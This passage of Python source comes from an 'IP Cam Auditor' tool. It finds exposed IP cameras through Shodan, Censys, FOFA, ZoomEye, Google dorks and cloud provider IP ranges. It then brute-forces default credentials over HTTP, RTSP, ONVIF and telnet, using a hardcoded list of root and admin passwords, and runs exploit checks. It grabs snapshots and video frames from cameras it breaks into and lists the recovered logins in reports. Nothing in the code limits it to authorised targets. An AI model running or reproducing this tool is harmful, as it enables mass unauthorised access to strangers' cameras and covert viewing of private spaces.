                        self.status_code = status_code
                        self.status = status_code
                        self.content = content
                        self.headers = headers
                resp = MockResponse(status, body, headers)
                if status and check["check"](resp):
                    found.append(check)
        except Exception:
            pass
    
    return found


# ──────────────────────────────────────────────
# Port Scanner
# ──────────────────────────────────────────────

def scan_ports_sync(ip, ports, timeout=2, threads=50):
    """Threaded port scanner."""
    open_ports = []
    lock = threading.Lock()
    
    def check_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            with lock:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_port, ports)
    
    return sorted(open_ports)


# ──────────────────────────────────────────────
# DNS Resolution
# ──────────────────────────────────────────────

def resolve_domain(domain):
    """Resolve domain to IP address(es)."""
    ips = []
    try:
        if HAS_DNSPYTHON:
            answers = dns.resolver.resolve(domain, 'A')
            ips = [str(r) for r in answers]
        else:
            ip = socket.gethostbyname(domain)
            ips = [ip]
    except Exception:
        try:
            ip = socket.gethostbyname(domain)
            ips = [ip]
        except Exception:
            pass
    return ips


# ──────────────────────────────────────────────
# Camera Audit Function (single target)
# ──────────────────────────────────────────────

def audit_camera(ip, port, args, report_data):
    """Audit a single camera IP:port pair."""
    result = {
        "ip": ip,
        "port": port,
        "timestamp": timestamp(),
        "brand": "Unknown",
        "brand_key": "generic",
        "open_ports": [],
        "http_auth_success": False,
        "rtsp_auth_success": False,
        "onvif_success": False,
        "credentials_found": [],
        "exploits_found": [],
        "snmp_info": [],
        "snapshot_captured": False,
        "rtsp_frame_captured": False,
        "telnet_open": False,
        "ntlm_detected": False,
        "firmware": "",
        "model": "",
        "mac": "",
    }
    
    timeout = args.timeout
    proxy = args.proxy
    
    # 1. Basic port check
    sys.stdout.write(f"  {blue('[*]')} Checking {ip}:{port}... ")
    sys.stdout.flush()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
    except Exception:
        print(red("Port closed"))
        return None
    
    print(green("Open"))
    
    # 2. Brand fingerprinting
    brand_name, brand_key = fingerprint_brand(ip, port, timeout=timeout, proxy=proxy)
    result["brand"] = brand_name
    result["brand_key"] = brand_key
    
    rtsp_brand, rtsp_key = fingerprint_from_rtsp(ip, port=554, timeout=timeout)
    if rtsp_brand and brand_name == "Unknown":
        result["brand"] = rtsp_brand
        result["brand_key"] = rtsp_key
    
    print(f"    {blue('[*]')} Brand: {cyan(brand_name)} ({brand_key})")
    
    # 3. Scan additional ports
    extra_ports = [p for p in COMMON_PORTS if p != port]
    open_ports = scan_ports_sync(ip, extra_ports, timeout=timeout, threads=args.threads)
    open_ports.insert(0, port)
    result["open_ports"] = sorted(open_ports)
    
    if open_ports:
        print(f"    {blue('[*]')} Open ports: {', '.join(str(p) for p in sorted(open_ports))}")
    
    # Check for telnet
    for tp in TELNET_PORTS:
        if tp in open_ports or scan_ports_sync(ip, TELNET_PORTS, timeout=2, threads=5):
            telnet_open, telnet_banner = check_telnet(ip, tp, timeout=timeout)
            if telnet_open:
                result["telnet_open"] = True
                print(f"    {yellow('[!]')} Telnet open on port {tp}")
                if telnet_banner:
                    print(f"      Banner: {telnet_banner[:100]}")
    
    # 4. Check SNMP
    for sp in SNMP_PORTS:
        if sp in open_ports or scan_ports_sync(ip, [sp], timeout=2, threads=3):
            snmp_data = check_snmp(ip, sp, timeout=timeout)
            if snmp_data:
                result["snmp_info"] = snmp_data
                for s in snmp_data:
                    print(f"    {yellow('[!]')} SNMP community '{s['community']}': {s['system_description'][:100]}")
    
    # 5. Check NTLM
    ntlm_detected, ntlm_msg = check_ntlm(ip, port, timeout=timeout)
    result["ntlm_detected"] = ntlm_detected
    if ntlm_detected:
        print(f"    {yellow('[!]')} {ntlm_msg}")
    
    # 6. Get credentials to test
    creds_to_test = list(DEFAULT_CREDS.get(brand_key, [])) + list(DEFAULT_CREDS.get("generic", []))
    if args.creds:
        for cred_entry in args.creds:
            if ":" in cred_entry:
                u, p = cred_entry.split(":", 1)
                creds_to_test.insert(0, (u, p))
    
    # 7. Test HTTP auth
    print(f"    {blue('[*]')} Testing {len(creds_to_test)} credential pairs...")
    
    for username, password in creds_to_test:
        success, status, info = test_http_auth(ip, port, username, password, timeout=timeout, proxy=proxy)
        if success:
            result["http_auth_success"] = True
            result["credentials_found"].append((username, password, "HTTP"))
            print(f"    {green('[+]')} HTTP auth success: {cyan(username)}:{yellow(password)}")
            break
    
    if not result["http_auth_success"]:
        for username, password in creds_to_test[:10]:
            success, status, info = test_digest_auth(ip, port, username, password, timeout=timeout, proxy=proxy)
            if success:
                result["http_auth_success"] = True
                result["credentials_found"].append((username, password, "Digest"))
                print(f"    {green('[+]')} Digest auth success: {cyan(username)}:{yellow(password)}")
                break
    
    # 8. Test RTSP auth
    rtsp_port = 554 if 554 in open_ports else port
    for username, password in creds_to_test[:20]:
        success, info = test_rtsp_auth(ip, rtsp_port, username, password, timeout=timeout)
        if success:
            result["rtsp_auth_success"] = True
            result["credentials_found"].append((username, password, "RTSP"))
            print(f"    {green('[+]')} RTSP auth success: {cyan(username)}:{yellow(password)} on port {rtsp_port}")
            break
    
    # 9. Test ONVIF auth
    if HAS_ONVIF and port in [80, 8080, 8899, 443, 8443]:
        for username, password in creds_to_test[:5]:
            onvif_success, onvif_info = test_onvif_auth(ip, port, username, password, timeout=timeout)
            if onvif_success and onvif_info:
                result["onvif_success"] = True
                result["credentials_found"].append((username, password, "ONVIF"))
                try:
                    result["model"] = onvif_info.get("Model", "")
                    result["firmware"] = onvif_info.get("FirmwareVersion", "")
                    result["mac"] = onvif_info.get("SerialNumber", "")
                except AttributeError:
                    result["model"] = str(onvif_info)[:100]
                print(f"    {green('[+]')} ONVIF auth success: {cyan(username)}:{yellow(password)}")
                break
    
    # 10. Run exploit checks
    if args.exploits:
        print(f"    {blue('[*]')} Running exploit checks...")
        exploits = run_all_exploit_checks(ip, port, brand_key, timeout=timeout, proxy=proxy)
        result["exploits_found"] = exploits
        for exp in exploits:
            print(f"    {red('[!]')} {exp['cve']}: {exp['description']} ({exp['severity']})")
            print(f"      {bold('Detail:')} {exp['detail']}")
    
    # 11. Capture snapshot
    if args.snapshot and result["http_auth_success"]:
        print(f"    {blue('[*]')} Attempting snapshot capture...")
        for u, p, auth_type in result["credentials_found"]:
            if auth_type == "HTTP":
                captured, img_data, msg = capture_snapshot(ip, port, u, p, timeout=timeout)
                if captured:
                    result["snapshot_captured"] = True
                    snap_dir = args.output or "snapshots"
                    os.makedirs(snap_dir, exist_ok=True)
                    fname = f"{snap_dir}/{ip}_{port}_snapshot.jpg"
                    with open(fname, "wb") as f:
                        f.write(img_data)
                    print(f"    {green('[+]')} Snapshot saved: {fname} ({len(img_data)} bytes)")
                else:
                    print(f"    {yellow('[-]')} {msg}")
                break
        
        if not result["snapshot_captured"] and HAS_OPENCV:
            for u, p, auth_type in result["credentials_found"]:
                captured, frame, msg = try_rtsp_stream(ip, rtsp_port, u, p, timeout=timeout)
                if captured and frame is not None:
                    result["rtsp_frame_captured"] = True
                    snap_dir = args.output or "snapshots"
                    os.makedirs(snap_dir, exist_ok=True)
                    fname = f"{snap_dir}/{ip}_{port}_rtsp.jpg"
                    cv2.imwrite(fname, frame)
                    print(f"    {green('[+]')} RTSP frame saved: {fname} ({frame.shape})")
                else:
                    print(f"    {yellow('[-]')} {msg}")
                break
    
    # 12. Try telnet brute-force
    if result["telnet_open"] and args.telnet_brute:
        print(f"    {blue('[*]')} Trying telnet brute-force...")
        telnet_creds = [
            ("root", ""), ("root", "root"), ("root", "admin"), ("root", "12345"),
            ("root", "jvbzd"), ("root", "pass"), ("root", "default"),
            ("admin", "admin"), ("admin", ""), ("admin", "12345"),
            ("admin", "123456"), ("admin", "password"),
        ]
        for u, p in telnet_creds:
            success, banner = try_telnet_login(ip, 23, u, p, timeout=timeout)
            if success:
                result["credentials_found"].append((u, p, "TELNET"))
                print(f"    {green('[+]')} Telnet login: {cyan(u)}:{yellow(p)}")
                print(f"      Banner: {banner[:100]}")
                break
    
    if result["credentials_found"] or result["exploits_found"]:
        print(f"  {green('[✓]')} {ip}:{port} - {cyan(brand_name)} - VULNERABLE")
        if result["credentials_found"]:
            for u, p, auth_type in result["credentials_found"]:
                print(f"     Creds: {u}:{p} ({auth_type})")
        if result["exploits_found"]:
            for exp in result["exploits_found"]:
                print(f"     Exploit: {exp['cve']}")
    else:
        print(f"  {yellow('[-]')} {ip}:{port} - {brand_name} - No credentials/exploits found")
    
    print()
    report_data.append(result)
    return result


# ──────────────────────────────────────────────
# Censys API
# ──────────────────────────────────────────────

def search_censys(query, api_id=None, api_secret=None, timeout=15):
    """Search Censys for exposed cameras."""
    if not api_id or not api_secret:
        return {"error": "Censys API ID and Secret required"}
    try:
        url = "https://search.censys.io/api/v2/hosts/search"
        auth = (api_id, api_secret)
        params = {"q": query, "per_page": 100}
        if HAS_REQUESTS:
            resp = requests.get(url, auth=auth, params=params, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                results = data.get("result", {}).get("hits", [])
                return {"count": len(results), "results": results}
            return {"error": f"HTTP {resp.status_code}: {resp.text[:200]}"}
        return {"error": "Requests library required"}
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────
# FOFA API
# ──────────────────────────────────────────────

def search_fofa(query, email=None, key=None, timeout=15):
    """Search FOFA for exposed cameras."""
    if not email or not key:
        return {"error": "FOFA email and key required"}
    try:
        query_b64 = base64.b64encode(query.encode()).decode()
        url = f"https://fofa.info/api/v1/search/all?email={email}&key={key}&qbase64={query_b64}&size=100"
        if HAS_REQUESTS:
            resp = requests.get(url, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("error") is False:
                    return {"count": data.get("size", 0), "results": data.get("results", [])}
                return {"error": data.get("errmsg", "Unknown FOFA error")}
            return {"error": f"HTTP {resp.status_code}"}
        return {"error": "Requests library required"}
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────
# ZoomEye API
# ──────────────────────────────────────────────

def search_zoomeye(query, api_key=None, timeout=15):
    """Search ZoomEye for exposed cameras."""
    if not api_key:
        return {"error": "ZoomEye API key required"}
    try:
        url = f"https://api.zoomeye.org/host/search?query={urllib.parse.quote(query)}&page=1&size=100"
        headers = {"API-KEY": api_key}
        if HAS_REQUESTS:
            resp = requests.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                return {"count": data.get("total", 0), "results": data.get("matches", [])}
            return {"error": f"HTTP {resp.status_code}: {resp.text[:200]}"}
        return {"error": "Requests library required"}
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────
# Google Dork Search
# ──────────────────────────────────────────────

def search_google_dorks(dork, api_key=None, cx=None, timeout=15):
    """Search Google using dork query."""
    if not api_key or not cx:
        return {"error": "Google API key and CX required"}
    try:
        url = "https://www.googleapis.com/customsearch/v1"
        params = {
            "key": api_key,
            "cx": cx,
            "q": dork,
            "num": 10,
        }
        if HAS_REQUESTS:
            resp = requests.get(url, params=params, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                items = data.get("items", [])
                results = []
                for item in items:
                    results.append({
                        "title": item.get("title", ""),
                        "link": item.get("link", ""),
                        "snippet": item.get("snippet", ""),
                    })
                return {"count": len(results), "results": results}
            return {"error": f"HTTP {resp.status_code}"}
        return {"error": "Requests library required"}
    except Exception as e:
        return {"error": str(e)}


def run_all_google_dorks(api_key=None, cx=None, max_results=50, timeout=15):
    """Run all Google dorks for camera discovery."""
    all_results = []
    for dork in GOOGLE_DORKS[:20]:
        result = search_google_dorks(dork, api_key, cx, timeout)
        if "results" in result:
            all_results.extend(result["results"])
            if len(all_results) >= max_results:
                break
        time.sleep(0.5)
    return all_results


# ──────────────────────────────────────────────
# Cloud IP Ranges
# ──────────────────────────────────────────────

CLOUD_RANGES = [
    "3.0.0.0/9", "13.32.0.0/15", "13.248.0.0/14", "15.177.0.0/12",
    "18.66.0.0/14", "18.144.0.0/9", "18.160.0.0/11", "18.192.0.0/11",
    "35.71.64.0/18", "35.176.0.0/12", "43.192.0.0/12", "52.4.0.0/14",
    "52.12.0.0/13", "52.24.0.0/14", "52.36.0.0/13", "52.44.0.0/12",
    "52.54.0.0/15", "52.58.0.0/15", "52.74.0.0/16", "52.76.0.0/15",
    "52.80.0.0/13", "52.84.0.0/14", "52.92.0.0/14", "52.94.0.0/15",
    "52.95.0.0/16", "52.192.0.0/11", "52.208.0.0/12", "52.220.0.0/14",
    "54.68.0.0/14", "54.72.0.0/15", "54.74.0.0/15", "54.76.0.0/13",
    "54.80.0.0/13", "54.88.0.0/14", "54.92.0.0/14", "54.144.0.0/12",
    "54.168.0.0/14", "54.172.0.0/15", "54.174.0.0/15", "54.178.0.0/16",
    "54.184.0.0/12", "54.192.0.0/12", "54.200.0.0/14", "54.204.0.0/15",
    "54.206.0.0/15", "54.208.0.0/14", "54.212.0.0/15", "54.214.0.0/15",
    "54.216.0.0/14", "54.220.0.0/15", "54.222.0.0/15", "54.224.0.0/13",
    "54.232.0.0/16", "54.233.0.0/16", "54.234.0.0/15", "54.236.0.0/15",
    "54.238.0.0/16", "54.239.0.0/17",
    "104.236.0.0/14", "159.203.0.0/16", "162.243.0.0/16", "165.227.0.0/16",
    "167.71.0.0/16", "167.99.0.0/16", "178.62.0.0/15", "188.166.0.0/16",
    "192.241.128.0/17", "206.189.0.0/16",
    "5.9.0.0/16", "46.4.0.0/16", "78.46.0.0/15", "88.99.0.0/16",
    "95.216.0.0/16", "136.243.0.0/16", "138.201.0.0/16", "142.132.0.0/16",
    "144.76.0.0/16", "148.251.0.0/16", "157.90.0.0/16", "159.69.0.0/16",
    "162.55.0.0/16", "167.235.0.0/16", "168.119.0.0/16", "176.9.0.0/16",
    "178.63.0.0/16", "188.40.0.0/16", "195.201.0.0/16", "213.239.0.0/16",
    "54.36.0.0/15", "54.37.0.0/16", "91.121.0.0/16", "92.222.0.0/15",
    "94.23.0.0/16", "137.74.0.0/16", "142.4.0.0/15", "143.0.0.0/16",
    "145.239.0.0/16", "146.0.32.0/19", "147.135.0.0/16", "149.56.0.0/16",
    "151.80.0.0/16", "158.69.0.0/16", "167.114.0.0/16", "176.31.0.0/16",
    "178.32.0.0/16", "178.33.0.0/16", "178.170.0.0/15", "188.165.0.0/16",
    "192.95.0.0/16", "192.99.0.0/16", "193.70.0.0/16", "198.27.64.0/18",
    "198.50.128.0/17", "198.100.144.0/20", "213.32.0.0/16", "213.186.33.0/24",
]


# ──────────────────────────────────────────────
# Report Generation
# ──────────────────────────────────────────────

def generate_text_report(report_data, filename=None):
    """Generate a text report of findings."""
    if not filename:
        filename = f"ipcam_report_{ts_filename()}.txt"
    
    lines = []
    lines.append("=" * 70)
    lines.append("IP Cam Auditor v4.0 — Security Assessment Report")
    lines.append(f"Generated: {timestamp()}")
    lines.append(f"Targets audited: {len(report_data)}")
    lines.append("=" * 70)
    lines.append("")
    
    vulnerable = [r for r in report_data if r["credentials_found"] or r["exploits_found"]]
    not_vulnerable = [r for r in report_data if not r["credentials_found"] and not r["exploits_found"]]
    
    lines.append(f"VULNERABLE: {len(vulnerable)}")
    lines.append(f"SECURE: {len(not_vulnerable)}")
    lines.append("")
    
    if vulnerable:
        lines.append("-" * 70)
        lines.append("VULNERABLE TARGETS")
        lines.append("-" * 70)
        lines.append("")
        for r in vulnerable:
            lines.append(f"  Target: {r['ip']}:{r['port']}")
            lines.append(f"  Brand: {r['brand']}")
            lines.append(f"  Open ports: {', '.join(str(p) for p in r['open_ports'])}")
            if r["credentials_found"]:
                lines.append("  CREDENTIALS FOUND:")
                for u, p, auth_type in r["credentials_found"]:
                    lines.append(f"    [{auth_type}] {u}:{p}")
            if r["exploits_found"]:
                lines.append("  EXPLOITS FOUND:")
                for exp in r["exploits_found"]:
                    lines.append(f"    {exp['cve']} ({exp['severity']})")
                    lines.append(f"      {exp['description']}")
                    lines.append(f"      {exp['detail']}")
            if r["snmp_info"]:
                lines.append("  SNMP INFO:")
                for s in r["snmp_info"]:
                    lines.append(f"    Community: {s['community']}")
                    lines.append(f"    System: {s['system_description'][:200]}")
            if r["snapshot_captured"]:
                lines.append("  SNAPSHOT: Captured")
            if r["rtsp_frame_captured"]:
                lines.append("  RTSP FRAME: Captured")
            if r["ntlm_detected"]:
                lines.append("  NTLM: Supported")
            if r["telnet_open"]:
                lines.append("  TELNET: Open")
            lines.append("")
    
    if not_vulnerable:
        lines.append("-" * 70)
        lines.append("SECURE TARGETS (no creds/exploits found)")
        lines.append("-" * 70)
        lines.append("")
        for r in not_vulnerable:
            lines.append(f"  {r['ip']}:{r['port']} — {r['brand']} — Ports: {', '.join(str(p) for p in r['open_ports'])}")
        lines.append("")
    
    lines.append("=" * 70)
    lines.append("End of Report")
    lines.append("=" * 70)
    
    report_text = "\n".join(lines)
    
    with open(filename, "w") as f:
        f.write(report_text)
    
    return filename


def generate_html_report(report_data, filename=None):
    """Generate an interactive HTML report."""
    if not filename:
        filename = f"ipcam_report_{ts_filename()}.html"
    
    vulnerable = [r for r in report_data if r["credentials_found"] or r["exploits_found"]]
    not_vulnerable = [r for r in report_data if not r["credentials_found"] and not r["exploits_found"]]
    
    total_creds = sum(len(r["credentials_found"]) for r in report_data)
    total_exploits = sum(len(r["exploits_found"]) for r in report_data)
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IP Cam Auditor — Report</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }}
  .container {{ max-width: 1200px; margin: 0 auto; }}
  h1 {{ color: #00d4aa; font-size: 28px; margin-bottom: 5px; }}
  h2 {{ color: #4fc3f7; font-size: 22px; margin: 30px 0 15px; border-bottom: 1px solid #1a2a3a; padding-bottom: 8px; }}
  h3 {{ color: #81c784; font-size: 18px; margin: 15px 0 10px; }}
  .subtitle {{ color: #888; font-size: 14px; margin-bottom: 30px; }}
  .stats {{ display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }}
  .stat-card {{ background: linear-gradient(135deg, #111927, #1a2332); border: 1px solid #2a3a4a; border-radius: 12px; padding: 20px 30px; flex: 1; min-width: 150px; }}
  .stat-card .number {{ font-size: 32px; font-weight: bold; }}
  .stat-card .label {{ font-size: 13px; color: #888; margin-top: 5px; }}
  .stat-card.vuln .number {{ color: #ff5252; }}
  .stat-card.secure .number {{ color: #69f0ae; }}
  .stat-card.creds .number {{ color: #ffd740; }}
  .stat-card.exploits .number {{ color: #ff6e40; }}
  .stat-card.total .number {{ color: #4fc3f7; }}
  .target {{ background: #111927; border: 1px solid #1e2d3d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }}
  .target.vulnerable {{ border-left: 4px solid #ff5252; }}
  .target.secure {{ border-left: 4px solid #69f0ae; }}
  .target-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
  .target-ip {{ font-size: 18px; font-weight: bold; color: #4fc3f7; }}
  .target-brand {{ font-size: 14px; color: #81c784; }}
  .badge {{ display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; }}
  .badge-danger {{ background: #ff5252; color: #000; }}
  .badge-success {{ background: #69f0ae; color: #000; }}
  .badge-warning {{ background: #ffd740; color: #000; }}
  .badge-info {{ background: #4fc3f7; color: #000; }}
  .creds-table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
  .creds-table th, .creds-table td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid #1e2d3d; font-size: 14px; }}
  .creds-table th {{ color: #888; font-weight: normal; text-transform: uppercase; font-size: 12px; }}
  .creds-table td {{ font-family: 'Courier New', monospace; }}
  .exploit-item {{ padding: 8px 0; border-bottom: 1px solid #1a2a3a; }}
  .exploit-item:last-child {{ border: none; }}
  .cve-id {{ color: #ff6e40; font-weight: bold; }}
  .severity {{ font-size: 12px; }}
  .severity-critical {{ color: #ff5252; }}
  .severity-high {{ color: #ff6e40; }}
  .severity-medium {{ color: #ffd740; }}
  .detail {{ color: #aaa; font-size: 13px; margin-top: 3px; }}
  .ports {{ color: #888; font-size: 13px; }}
  .info-row {{ padding: 5px 0; font-size: 14px; }}
  @media (max-width: 768px) {{ .stats {{ flex-direction: column; }} }}
</style>
</head>
<body>
<div class="container">
<h1>📷 IP Cam Auditor — Report</h1>
<p class="subtitle">Generated: {timestamp()} | Targets: {len(report_data)}</p>

<div class="stats">
  <div class="stat-card vuln"><div class="number">{len(vulnerable)}</div><div class="label">VULNERABLE</div></div>
  <div class="stat-card secure"><div class="number">{len(not_vulnerable)}</div><div class="label">SECURE</div></div>
  <div class="stat-card creds"><div class="number">{total_creds}</div><div class="label">CREDENTIALS</div></div>
  <div class="stat-card exploits"><div class="number">{total_exploits}</div><div class="label">EXPLOITS</div></div>
  <div class="stat-card total"><div class="number">{len(report_data)}</div><div class="label">TOTAL</div></div>
</div>
"""
    
    if vulnerable:
        html_content += "<h2>🔴 Vulnerable Targets</h2>\n"
        for r in vulnerable:
            open_ports_str = ", ".join(str(p) for p in r["open_ports"])
            html_content += f"""
<div class="target vulnerable">
  <div class="target-header">
    <div><span class="target-ip">{r['ip']}:{r['port']}</span> <span class="target-brand">{r['brand']}</span></div>
    <div><span class="badge badge-danger">VULNERABLE</span></div>
  </div>
  <div class="ports">Open ports: {open_ports_str}</div>
"""
            if r["credentials_found"]:
                html_content += "  <h3>🔑 Credentials Found</h3>\n"
                html_content += '  <table class="creds-table"><tr><th>Username</th><th>Password</th><th>Type</th></tr>\n'
                for u, p, auth_type in r["credentials_found"]:
                    html_content += f"<tr><td>{html.escape(u)}</td><td>{html.escape(p)}</td><td>{auth_type}</td></tr>\n"
                html_content += "  </table>\n"
            
            if r["exploits_found"]:
                html_content += "  <h3>💥 Exploits Found</h3>\n"
                for exp in r["exploits_found"]:
                    sev_class = "severity-critical" if "CRITICAL" in exp["severity"] else "severity-high" if "HIGH" in exp["severity"] else "severity-medium"
                    html_content += f"""
  <div class="exploit-item">
    <span class="cve-id">{exp['cve']}</span> — {html.escape(exp['description'])}
    <span class="severity {sev_class}">({exp['severity']})</span>
    <div class="detail">{html.escape(exp['detail'])}</div>
  </div>
"""
            
            if r["snmp_info"]:
                html_content += "  <h3>🔌 SNMP Info</h3>\n"
                for s in r["snmp_info"]:
                    html_content += f'  <div class="info-row">Community: <b>{s["community"]}</b> — {html.escape(s["system_description"][:200])}</div>\n'
            
            if r["snapshot_captured"]:
                html_content += '  <div class="info-row">📸 Snapshot captured (<a href="#" style="color:#4fc3f7;">see output directory</a>)</div>\n'
            if r["rtsp_frame_captured"]:
                html_content += '  <div class="info-row">🎥 RTSP frame captured</div>\n'
            if r["ntlm_detected"]:
                html_content += '  <div class="info-row">🔐 NTLM authentication supported</div>\n'
            if r["telnet_open"]:
                html_content += '  <div class="info-row">🖥️ Telnet service open</div>\n'
            
            if r.get("model"):
                html_content += f'  <div class="info-row">Model: {html.escape(r["model"])}</div>\n'
            if r.get("firmware"):
                html_content += f'  <div class="info-row">Firmware: {html.escape(r["firmware"])}</div>\n'
            if r.get("mac"):
                html_content += f'  <div class="info-row">MAC/Serial: {html.escape(r["mac"])}</div>\n'
            
            html_content += "</div>\n"
    
    if not_vulnerable:
        html_content += "<h2>🟢 Secure Targets (No Credentials/Exploits Found)</h2>\n"
        for r in not_vulnerable:
            open_ports_str = ", ".join(str(p) for p in r["open_ports"])
            html_content += f"""
<div class="target secure">
  <div class="target-header">
    <div><span class="target-ip">{r['ip']}:{r['port']}</span> <span class="target-brand">{r['brand']}</span></div>
    <div><span class="badge badge-success">SECURE</span></div>
  </div>
  <div class="ports">Open ports: {open_ports_str}</div>
</div>
"""
    
    html_content += "</div></body></html>"
    
    with open(filename, "w") as f:
        f.write(html_content)
    
    return filename


def generate_csv_report(report_data, filename=None):
    """Generate a CSV report of findings."""
    if not filename:
        filename = f"ipcam_report_{ts_filename()}.csv"
    
    with open(filename, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Port", "Brand", "Open Ports", "Credentials Found", "Exploits Found",
                         "SNMP", "NTLM", "Telnet", "Snapshot", "RTSP Frame", "Model", "Firmware"])
        for r in report_data:
            creds = "; ".join(f"{u}:{p} ({t})" for u, p, t in r["credentials_found"]) if r["credentials_found"] else ""
            exploits = "; ".join(f"{e['cve']}" for e in r["exploits_found"]) if r["exploits_found"] else ""
            writer.writerow([
                r["ip"], r["port"], r["brand"], ", ".join(str(p) for p in r["open_ports"]),
                creds, exploits,
                "Yes" if r["snmp_info"] else "No",
                "Yes" if r["ntlm_detected"] else "No",
                "Yes" if r["telnet_open"] else "No",
                "Yes" if r["snapshot_captured"] else "No",
                "Yes" if r["rtsp_frame_captured"] else "No",
                r.get("model", ""), r.get("firmware", "")
            ])
    
    return filename


# ──────────────────────────────────────────────
# Interactive Discovery Wizard
# ──────────────────────────────────────────────

def discovery_wizard(args):
    """Interactive menu-driven discovery wizard."""
    print(cyan("""
╔══════════════════════════════════════════╗
║      IP Cam Discovery Wizard             ║
║  Select your discovery method:           ║
╠══════════════════════════════════════════╣
║  1. Scan local network (CIDR range)      ║
║  2. Single remote target (IP:port)       ║
║  3. Shodan search (API key required)     ║
║  4. Censys search (API ID+Secret req.)   ║
║  5. FOFA search (email+key required)     ║
║  6. ZoomEye search (API key required)    ║
║  7. Google Dork search (API+CX required) ║
║  8. DNS/DDNS domain resolution           ║
║  9. UPnP discovery (local network)       ║
║  10. Scan cloud provider IP ranges       ║
║  11. Load targets from file              ║
║  0. Exit                                 ║
╚══════════════════════════════════════════╝
"""))
    
    choice = input(f"{cyan('[?]')} Select option (0-11): ").strip()
    
    if choice == "0":
        return []
    elif choice == "1":
        cidr = input(f"{cyan('[?]')} CIDR range (e.g., 192.168.1.0/24): ").strip()
        port = input(f"{cyan('[?]')} Port to scan [80]: ").strip() or "80"
        return [(str(ip), int(port)) for ip in ipaddress.IPv4Network(cidr, strict=False).hosts()]
    elif choice == "2":
        target = input(f"{cyan('[?]')} Remote target (IP:port): ").strip()
        try:
            ip, port = target.rsplit(":", 1)
            return [(ip.strip(), int(port.strip()))]
        except ValueError:
            print(red("Invalid format. Use IP:port"))
            return []
    elif choice == "3":
        query = input(f"{cyan('[?]')} Shodan search query: ").strip()
        key = input(f"{cyan('[?]')} Shodan API key: ").strip()
        print(blue("[*] Searching Shodan..."))
        try:
            import shodan  # type: ignore
            api = shodan.Shodan(key)
            results = api.search(query)
            targets = []
            for r in results.get("matches", []):
                ip = r.get("ip_str", "")
                for port_data in r.get("ports", [80]):
                    targets.append((ip, port_data))
            print(green(f"[+] Found {len(targets)} targets"))
            return targets
        except ImportError:
            print(red("[-] shodan package not installed. pip install shodan"))
            return []
        except Exception as e:
            print(red(f"[-] Shodan error: {e}"))
            return []
    elif choice == "4":
        query = input(f"{cyan('[?]')} Censys search query: ").strip()
        api_id = input(f"{cyan('[?]')} Censys API ID: ").strip()
        api_secret = input(f"{cyan('[?]')} Censys API Secret: ").strip()
        print(blue("[*] Searching Censys..."))
        result = search_censys(query, api_id, api_secret)
        if "results" in result:
            targets = []
            for r in result["results"]:
                ip = r.get("ip", "")
                services = r.get("services", [{"port": 80}])
                for svc in services:
                    targets.append((ip, svc.get("port", 80)))
            print(green(f"[+] Found {len(targets)} targets"))
            return targets
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            return []
    elif choice == "5":
        query = input(f"{cyan('[?]')} FOFA search query: ").strip()
        email = input(f"{cyan('[?]')} FOFA email: ").strip()
        key = input(f"{cyan('[?]')} FOFA key: ").strip()
        print(blue("[*] Searching FOFA..."))
        result = search_fofa(query, email, key)
        if "results" in result:
            targets = []
            for r in result["results"]:
                if len(r) >= 2:
                    targets.append((str(r[0]), int(r[1]) if str(r[1]).isdigit() else 80))
            print(green(f"[+] Found {len(targets)} targets"))
            return targets
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            return []
    elif choice == "6":
        query = input(f"{cyan('[?]')} ZoomEye search query: ").strip()
        key = input(f"{cyan('[?]')} ZoomEye API key: ").strip()
        print(blue("[*] Searching ZoomEye..."))
        result = search_zoomeye(query, key)
        if "results" in result:
            targets = []
            for r in result["results"]:
                ip = r.get("ip", "")
                port_info = r.get("portinfo", {})
                port = port_info.get("port", 80)
                targets.append((ip, port))
            print(green(f"[+] Found {len(targets)} targets"))
            return targets
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            return []
    elif choice == "7":
        print(blue("[*] Running Google dork search (this may use quota)..."))
        api_key = input(f"{cyan('[?]')} Google API key: ").strip()
        cx = input(f"{cyan('[?]')} Google Custom Search CX: ").strip()
        results = run_all_google_dorks(api_key, cx)
        targets = []
        for r in results:
            link = r.get("link", "")
            parsed = urllib.parse.urlparse(link)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            if host:
                try:
                    socket.inet_aton(host)
                    targets.append((host, port))
                except OSError:
                    pass
        print(green(f"[+] Found {len(targets)} targets from dork results"))
        return targets
    elif choice == "8":
        domain = input(f"{cyan('[?]')} Domain/DDNS to resolve: ").strip()
        port = int(input(f"{cyan('[?]')} Port [80]: ").strip() or "80")
        ips = resolve_domain(domain)
        if ips:
            print(green(f"[+] Resolved {domain} → {', '.join(ips)}"))
            return [(ip, port) for ip in ips]
        else:
            print(red(f"[-] Could not resolve {domain}"))
            return []
    elif choice == "9":
